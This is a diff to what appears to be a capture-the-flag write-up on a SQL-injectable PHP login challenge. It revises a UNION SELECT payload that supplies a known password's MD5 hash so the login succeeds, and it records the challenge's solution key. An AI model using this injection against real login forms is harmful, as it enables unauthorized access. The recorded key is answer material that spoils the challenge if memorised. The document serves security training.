@@ -38,10 +38,18 @@ if($_POST[user] && $_POST[pass]) {
 Let's inject a fake password rather than a fake user:
 
 $query = @mysql_fetch_array(mysql_query("select pw from php3 where user='$user'")); //Original
-$MD5OFPASS = md5('password');
-$query = @mysql_fetch_array(mysql_query("select pw from php3 where user='' UNION SELECT user FROM php3 WHERE pw='$MD5OFPASS'"));
+$MD5OFPASS = md5('Password');
+
+//Note it is already selecting the column 'pw' from the row:
+
+$query = @mysql_fetch_array(mysql_query("select pw from php3 where user='' UNION SELECT $MD5OFPASS"));
 
 And use the input fields:
 
-Username: ' UNION SELECT * FROM php3 WHERE (pw='5f4dcc3b5aa765d61d8327deb882cf99')")); -- 
-Password: password
+Username: ' UNION SELECT "dc647eb65e6711e155375218212b3964" -- 
+Password: Password
+
+Key: 50c90a07790d4d0ab7fc7f695cb61d0e
+
+*Note: I overthought this question really hard and spent an extra 2 hours on it that I shouldn't have. I neglected to see the select pw and thought it selected the entire row, hence tried to use a 
+UNION ALL SELECT '' , '' ,... , XXXXXXXX as pw , .... -- as my injection, and spent a lot of time facepalming.
